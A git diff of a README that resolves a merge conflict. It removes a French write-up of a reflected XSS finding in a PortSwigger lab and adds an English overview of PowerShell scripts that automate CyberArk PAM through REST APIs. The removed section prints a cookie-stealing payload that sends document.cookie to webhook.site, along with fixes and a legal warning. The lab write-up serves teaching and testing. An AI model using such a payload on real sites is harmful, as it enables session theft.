@@ -1,210 +1,205 @@
-<<<<<<< HEAD
-# 🔒 Analyse de Sécurité - Étude des Vulnérabilités Web
+# 📁 PowerShell Script Overview
 
-Ce dépôt contient une analyse détaillée des vulnérabilités de sécurité identifiées sur le site web de test.
+This project contains **PowerShell scripts** to **automate** the administration of the **CyberArk PAM** solution via **REST APIs**.
 
-## 📁 Fichiers Inclus
+## 🗂 Project Directory Structure  
 
-### 1. `RAPPORT_VULNERABILITES.md`
-Rapport complet d'analyse de sécurité contenant :
-- Description détaillée de la vulnérabilité XSS identifiée
-- Analyse technique approfondie
-- 8 preuves de concept (PoC) différentes
-- Recommandations de correction
-- Checklist de sécurité
+📁 CyberArk-PAM-Automation  
+│</br>
+📁 scripts </br>
+│    └── 🟦 main.ps1 </br>
+│    └── 🟦 auth_handler.ps1 </br> 
+│    └── 🟦 account_handler.ps1 </br>
+│    └── 🟦 account_group_handler.ps1 </br>
+│    └── 🟦 safe_handler.ps1 </br>
+│    └── 🟦 safe_member_handler.ps1 </br>
+│    └── 🟦 platform_handler.ps1 </br>
+│    └── 🟦 connection_component_handler.ps1 </br>
+│    └── 🟦 user_handler.ps1 </br>
+│    └── 🟦 group_handler.ps1 </br>
+│    └── 🟦 cpm_actions_handler.ps1 </br>
+│    └── 🟦 system_health_handler.ps1 </br>
+│    └── 🟦 log_handler.ps1 </br>
+│</br>
+📁 SampleCSVFiles </br>
+│   └── 📂 SampleFileAccount </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_accounts_add.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_accounts_update.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_accounts_delete.csv </br>
+│   └── 📂 SampleFileAccountGroup </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_account_groups_add.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_account_groups_members_add.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_account_groups_members_delete.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_account_groups_members_get.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_account_groups_by_safe.csv </br>
+│   └── 📂 SampleFileSafe </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_safes_add.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_safes_update.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_safes_delete.csv </br>
+│   └── 📂 SampleFileSafeMember </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_safes_members_add.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_safes_members_delete.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_safes_members_update.csv </br>
+│   └── 📂 SampleFilePlatform </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_platforms_import.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_platforms_export.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📂 Platform_ZipFile </br>
+│ │&emsp;&emsp;&emsp;&emsp;&nbsp; └──📦 platform_to_import_name.zip **(one or more zip files)**</br>
+│ │&emsp;&emsp;&nbsp; └──📂 Exported_Platform </br>
+│ │&emsp;&emsp;&emsp;&emsp;&nbsp; └──📦 exported_platform__name.zip **(one or more zip files)**</br>
+│   └── 📂 SampleFileConnectionComponent </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_connection_components_import.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📂 Connection_Component_ZipFile </br>
+│ │&emsp;&emsp;&emsp;&emsp;&nbsp; └──📦 connection_component_to_import_name.zip **(one or more zip files)**</br>
+│   └── 📂 SampleFileUser </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_users_add.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_users_update.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_users_delete.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_users_activate.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_users_enable.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_users_disable.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_users_reset_password.csv </br>
+│   └── 📂 SampleFileGroup </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_groups_add.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_groups_update.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_groups_delete.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_groups_members_add.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_groups_members_remove.csv </br>
+│   └── 📂 SampleFileCPMActions </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_verifypass.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_changepass_immediately.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_changepass_inVault.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_sample_changepass_specifyNextPass.csv </br>
+│ │&emsp;&emsp;&nbsp; └──📄 sample_reconcilepass.csv </br>
+│   └── 📂 SampleFileSystemHealth </br>
+│  &emsp;&emsp;&nbsp;&nbsp; └──📄 sample_components.csv </br>
+│</br>
+📁 Documentation </br>
+│    └── 📑 main.pdf </br>
+│    └── 📑 auth.pdf </br> 
+│    └── 📑 account.pdf </br>
+│    └── 📑 account_group.pdf </br>
+│    └── 📑 safe.pdf </br>
+│    └── 📑 safe_member.pdf </br>
+│    └── 📑 platform.pdf </br>
+│    └── 📑 connection_component.pdf </br>
+│    └── 📑 user.pdf </br>
+│    └── 📑 group.pdf </br>
+│    └── 📑 cpm_actions.pdf </br>
+│    └── 📑 system_health.pdf </br>
+│    └── 📑 log.pdf </br>
+│ </br>
+📁 Log </br>
+│    └── 📄 log.log </br> 
+│    └── 📄 error.log </br>
+│</br>
+└─────── 📝 README.md </br>
 
-### 2. `PAYLOADS_XSS.md`
-Collection de 42+ payloads XSS prêts à l'emploi :
-- Payloads de base
-- Payloads de vol de données
-- Payloads de redirection
-- Payloads de défacement
-- Payloads alternatifs (bypass de filtres)
-- Payloads avec encodage
-- Payloads polyglottes
-- Payloads avancés
 
-### 3. `test_xss.py`
-Script Python automatisé pour tester les vulnérabilités XSS :
-- Tests automatisés de multiples payloads
-- Analyse de la réponse du serveur
-- Détection automatique de la réflexion
-- Génération de rapports
+## 📄 File Description  
 
-### 4. `README.md` (ce fichier)
-Documentation et guide d'utilisation
+> ```
+> 📦 platform_name.zip : Zip file containing the platform/connection component to import 
+> 🟦 file_name.ps1     : PowerShell Script  
+> 📄 file_name.csv     : CSV file, semicolon-separated, containing data used to execute actions 
+> 📑 file_name.pdf     : This file explains the detailed description of each script’s purpose, the necessary permissions for execution, and the expected structure of the CSV files used as input.
+> 📝 README.md         : This file explains the structure and usage of the project  
+> ```
+
+**This project is structured into multiple PowerShell scripts, each responsible for handling specific operations related to the PVWA API. Below is a detailed overview of each script and its responsibilities :**
 
 ---
 
-## 🎯 Vulnérabilité Identifiée
-
-### XSS Réfléchi (Reflected Cross-Site Scripting)
-
-**Sévérité:** 🔴 **CRITIQUE**  
-**Paramètre vulnérable:** `search` (GET)  
-**Endpoint:** `/?search=<payload>`
-
-La fonctionnalité de recherche reflète directement la valeur du paramètre `search` dans le HTML sans aucun encodage, permettant l'exécution de code JavaScript arbitraire.
+#### 🔹 🔘 `main.ps1`
+- **Purpose**: The main entry point of the project.
+- **Functionality**: Displays the interactive menu and orchestrates all available actions by calling the corresponding handler scripts.
 
 ---
 
-## 🚀 Utilisation
+#### 🔹 `auth_handler.ps1`
+- **Purpose**: Authentication handler.
+- **Functionality**: Logs in to the PVWA, retrieves the authentication token for subsequent API requests, and handles logout to securely end the session.
 
-### Prérequis
+---
 
-```bash
-# Installer Python 3
-# Installer la bibliothèque requests
-pip install requests
+#### 🔹 `account_handler.ps1`
+- **Purpose**: Account management.
+- **Functionality**: Add, update, delete, and list accounts stored in the vault.
+
+---
+
+#### 🔹 `account_group_handler.ps1`
+- **Purpose**: Account group management.
+- **Functionality**: Add account groups and list them by safe; add, delete, and retrieve members within account groups.
+
+---
+
+#### 🔹 `safe_handler.ps1`
+- **Purpose**: Safe management.
+- **Functionality**: Add, update, delete, and list safes.
+
+---
+
+#### 🔹 `safe_member_handler.ps1`
+- **Purpose**: Safe member management.
+- **Functionality**: Add, update, and delete members from safes.
+
+---
+
+#### 🔹 `platform_handler.ps1`
+- **Purpose**: Platform management.
+- **Functionality**: Import, export, retrieve details, and list all supported platforms.
+
+---
+
+#### 🔹 `connection_component_handler.ps1`
+- **Purpose**: Connection component management.
+- **Functionality**: List and import connection components.
+
+---
+
+#### 🔹 `user_handler.ps1`
+- **Purpose**: User management.
+- **Functionality**: Add, update, delete, enable/disable, activate, reset password, and list users.
+
+---
+
+#### 🔹 `group_handler.ps1`
+- **Purpose**: Group management.
+- **Functionality**: Add, update, delete groups, add and remove group members, and list all vault groups.
+
+---
+
+#### 🔹 `cpm_actions_handler.ps1`
+- **Purpose**: Central Policy Manager (CPM) operations.
+- **Functionality**: Perform credential verification, immediate change, in-vault change, change with a predefined password, and reconciliation.
+
+---
+
+#### 🔹 `system_health_handler.ps1`
+- **Purpose**: System monitoring.
+- **Functionality**: Retrieve summary and detailed monitoring data about system components (PVWA, CPM, PSM, etc.).
+
+---
+
+#### 🔹 `log_handler.ps1`
+- **Purpose**: Logging operations.
+- **Functionality**: Logs actions and errors to local files for debugging or auditing purposes.
+
+## ▶️ Usage  
+
+Run **PowerShell** in the parent directory **"CyberArk-PAM-Automation"** and then execute the following command:
+
+```powershell
+PowerShell -ExecutionPolicy Bypass -File .\main.ps1
 ```
 
-### Exécution du Script de Test
+## ℹ️ Additional Information on CyberArk REST APIs
+For more details on the required and optional parameters for using CyberArk's REST APIs, please refer to the official [CyberArk REST API documentation](https://docs.cyberark.com/pam-self-hosted/latest/en/content/webservices/implementing%20privileged%20account%20security%20web%20services%20.htm).
 
-```bash
-python test_xss.py
-```
 
-Le script va :
-1. Analyser la réponse du serveur
-2. Tester automatiquement 10 payloads différentes
-3. Générer un rapport avec les résultats
-
-### Test Manuel
-
-Vous pouvez tester manuellement en utilisant les URLs suivantes :
-
-#### Test de base (Alerte):
-```
-https://0a1600240463e66b803bb815008800e5.web-security-academy.net/?search=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
-```
-
-#### Test avec vol de cookies:
-```
-https://0a1600240463e66b803bb815008800e5.web-security-academy.net/?search=%3Cscript%3Efetch%28%27https%3A%2F%2Fwebhook.site%2FUNIQUE_ID%3Fcookie%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E
-```
-
-**Note:** Remplacez `UNIQUE_ID` par votre ID webhook.site pour recevoir les données.
-
----
-
-## 📊 Résultats de l'Analyse
-
-### Vulnérabilités Confirmées
-
-✅ **XSS Réfléchi** - Confirmé et exploité avec succès
-
-### Caractéristiques de la Vulnérabilité
-
-- ✅ Aucun encodage HTML
-- ✅ Aucun filtrage de caractères spéciaux
-- ✅ Aucune validation d'entrée
-- ✅ Injection directe dans le contexte HTML
-- ✅ Exécution immédiate du JavaScript
-
-### Impact
-
-- Vol de cookies de session
-- Vol d'informations d'authentification
-- Défacement de page
-- Redirection vers des sites malveillants
-- Exécution d'actions au nom de l'utilisateur
-- Vol de données sensibles
-
----
-
-## 🛡️ Recommandations
-
-### Correction Immédiate
-
-1. **Encoder toutes les sorties utilisateur** (Output Encoding)
-   ```php
-   echo htmlspecialchars($search, ENT_QUOTES, 'UTF-8');
-   ```
-
-2. **Valider et filtrer les entrées** (Input Validation)
-   ```php
-   if (!preg_match('/^[a-zA-Z0-9\s]+$/', $search)) {
-       $search = '';
-   }
-   ```
-
-3. **Implémenter une Content Security Policy (CSP)**
-   ```html
-   <meta http-equiv="Content-Security-Policy" 
-         content="default-src 'self'; script-src 'self';">
-   ```
-
-### Bonnes Pratiques
-
-- Utiliser des frameworks modernes avec encodage automatique
-- Activer HttpOnly et Secure sur les cookies
-- Effectuer des tests de sécurité réguliers
-- Former les développeurs aux bonnes pratiques
-
----
-
-## 📚 Ressources
-
-### Documentation
-
-- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
-- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
-- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
-
-### Outils Utiles
-
-- **Webhook.site:** https://webhook.site/ (pour recevoir les données volées lors des tests)
-- **URL Encoder:** https://www.urlencoder.org/
-- **Burp Suite:** Outil de test de sécurité web
-
----
-
-## ⚠️ Avertissement Légal
-
-**IMPORTANT:** Ce matériel est fourni **uniquement à des fins éducatives** et de test de sécurité **autorisé**. 
-
-- ❌ Ne pas utiliser sur des systèmes sans autorisation explicite
-- ❌ L'utilisation non autorisée est **illégale**
-- ❌ Peut entraîner des poursuites pénales
-- ✅ Utiliser uniquement dans des environnements de test contrôlés
-- ✅ Obtenir une autorisation écrite avant tout test
-
----
-
-## 📝 Structure du Projet
-
-```
-.
-├── README.md                    # Documentation principale
-├── RAPPORT_VULNERABILITES.md    # Rapport détaillé d'analyse
-├── PAYLOADS_XSS.md             # Collection de payloads
-└── test_xss.py                 # Script de test automatisé
-```
-
----
-
-## 🔍 Méthodologie d'Analyse
-
-1. **Reconnaissance:** Identification des fonctionnalités du site
-2. **Test de base:** Injection d'une payload XSS simple
-3. **Confirmation:** Vérification de l'exécution du code
-4. **Analyse approfondie:** Test de multiples payloads
-5. **Documentation:** Création du rapport et des PoC
-
----
-
-## 📞 Support
-
-Pour toute question concernant cette analyse :
-- Consultez le rapport détaillé dans `RAPPORT_VULNERABILITES.md`
-- Référez-vous aux payloads dans `PAYLOADS_XSS.md`
-- Exécutez `test_xss.py` pour des tests automatisés
-
----
-
-**Version:** 1.0  
-**Date:** Analyse effectuée  
-**Statut:** Vulnérabilité confirmée et documentée
-=======
-# cyberark-automation
->>>>>>> 741358c809cfdebd9fdddc4c7835b82dfe723ec1
+##  Author
+🧑‍💻 **[Ayoub RAKINE](https://linkedin.com/in/ayoub-rakine)**</br>
+🏢 **NEVERHACK**</br>
+</br>
+©️2025
